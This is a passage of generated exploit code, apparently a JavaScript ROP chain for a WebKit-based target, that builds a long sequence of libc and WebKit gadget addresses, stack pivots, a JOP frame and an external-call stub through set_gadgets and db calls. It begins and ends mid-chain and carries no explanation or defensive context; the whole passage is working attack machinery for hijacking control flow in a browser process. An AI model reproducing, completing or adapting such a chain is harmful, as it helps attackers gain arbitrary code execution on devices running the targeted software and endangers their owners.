libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2203:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2205:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+152136, //L2208
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+152104, //L2206
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+152120, //L2207
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2206:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2207:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2208:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+152208, //L2209
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2209:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+152264, //L2212
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2212:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+152360, //L2215
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2214:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L2215:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+152448, //L2216
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+152464, //L2218
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2216:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2218:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+152616, //L2220
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+152648, //L2222
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+152600, //L2219
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+152632, //L2221
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2219:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2220:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2221:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2222:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+152768, //L2224
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+152784, //L2225
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+152752, //L2223
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2223:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2224:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2225:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+152872, //L2226
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2226:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+152928, //L2229
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2229:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+153016, //L2232
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2231:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+792472,); //pop rcx
//L2232:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2234:
db([40, 0]); // 0x28
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+153144, //L2235
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153160, //L2237
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2235:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2237:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+153304, //L2240
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+153272, //L2238
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153288, //L2239
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2238:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2239:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2240:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+153400, //L2243
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2242:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L2243:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+153488, //L2244
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153504, //L2246
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2244:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2246:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+153648, //L2249
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+153616, //L2247
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153632, //L2248
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2247:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2248:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2249:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+153720, //L2250
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2250:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+153776, //L2253
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2253:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+153872, //L2256
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2255:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L2256:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+153960, //L2257
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153976, //L2259
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2257:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2259:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+154128, //L2261
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+154160, //L2263
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+154112, //L2260
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+154144, //L2262
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2260:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2261:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2262:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2263:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+154280, //L2265
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+154296, //L2266
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+154264, //L2264
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2264:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2265:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2266:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+154384, //L2267
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2267:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+154440, //L2270
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2270:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+154536, //L2271
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2271:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+154592, //L2274
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2274:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2275:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2276:
db([16, 0]); // 0x10
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+154744, //L2277
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+154800, //L2280
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2280:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+154920, //L2283
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2282:
db([32, 0]); // 0x20
set_gadget(libc_base+792472,); //pop rcx
//L2283:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+155008, //L2284
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155024, //L2286
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2284:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2286:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+155168, //L2289
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+155136, //L2287
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155152, //L2288
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2287:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2288:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2289:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+155264, //L2292
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2291:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+792472,); //pop rcx
//L2292:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+155352, //L2293
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155368, //L2295
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2293:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2295:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+155512, //L2298
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+155480, //L2296
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155496, //L2297
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2296:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2297:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2298:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2300:
ropchain+155616, //L2299
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+86472, //_create_extcall
//L2299:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+155704, //L2303
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2302:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+792472,); //pop rcx
//L2303:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+155792, //L2304
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155808, //L2306
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2304:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2306:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+155952, //L2309
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+155920, //L2307
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155936, //L2308
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2307:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2308:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2309:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2310:
jop_frame_addr,
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+156096, //L2313
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2312:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L2313:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+156184, //L2314
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156200, //L2316
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2314:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2316:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+156344, //L2319
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+156312, //L2317
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156328, //L2318
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2317:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2318:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2319:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+156440, //L2322
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2321:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2322:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+156528, //L2323
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156544, //L2325
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2323:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2325:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+156688, //L2328
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+156656, //L2326
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156672, //L2327
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2326:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2327:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2328:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2330:
ropchain+156792, //L2329
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+158952, //L2331
//L2329:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+156928, //L2333
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+156944, //L2334
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156912, //L2332
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2332:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2333:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2334:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+157064, //L2336
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157080, //L2337
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+157048, //L2335
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2335:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2336:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2337:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157176, //L2338
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157192, //L2339
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2338:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2339:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157304, //L2340
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157288, //L2341
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2341:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+157392, //L2343
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+157376, //L2342
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2342:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2343:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157488, //L2344
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157504, //L2345
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2344:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2345:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157616, //L2346
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157600, //L2347
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2347:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2346:
db([0, 0]); // 0x0
//L2121:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
